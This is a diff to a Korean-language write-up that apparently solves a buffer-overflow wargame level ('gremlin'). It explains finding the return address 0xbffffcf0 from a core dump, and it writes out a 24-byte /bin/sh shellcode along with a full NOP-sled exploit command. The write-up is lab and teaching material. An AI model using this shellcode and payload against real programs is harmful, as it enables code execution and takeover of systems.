@@ -123,7 +123,7 @@ $ gdb -q -c core
 **우리가 buffer배열의 주소로 구한 0xbffffb88과는 확연히 다른 주소이다.**  
 따라서 payload과정에서 시간을 절약하기 위해서 core덤프를 확인하고 진행하는 것이 정신건강에 좋다.
 
-이제 우리의 ret주소는 0xbffffcf0으로 잡고 buffer 앞부분에 NOP코드를 넣어 NOP 슬라이딩시켜 shellcode가 실행되게 하면 될 것 같다.
+이제 우리의 ret주소는 **0xbffffcf0**으로 잡고 buffer 앞부분에 NOP코드를 넣어 NOP 슬라이딩시켜 shellcode가 실행되게 하면 될 것 같다.
 
 ------
 
@@ -133,7 +133,7 @@ $ gdb -q -c core
 
 1. buffer의 크기는 256Byte
 2. SFP 4Byte
-3. RET 주소에 [$ebp-2256]의 주소를 넣으면 된다.
+3. RET 주소에 0xbffffcf0 주소를 넣으면 된다.
    
 메모리 상태를 예상해보면 아래와 같다.
 
@@ -149,14 +149,11 @@ buffer부분에 shellcode를 올려놓고 ret주소에 buffer주소를 넣으면
 shell(24byte) = \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
 ```
 
-
-buffer_addr : 0xbffffcf0
-
 <br>
 
 #### Payload
 
-> NOP(100) + SHELL(24) + NOP(260-100-24) + EBP-256주소
+> NOP(100) + SHELL(24) + NOP(260-100-24) + **0xbffffcf0**
 
 ```shell
 $ ./gremlin `python -c 'print "\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"+"\x90"*(260-100-24)+"\xf0\xfc\xff\xbf"'`
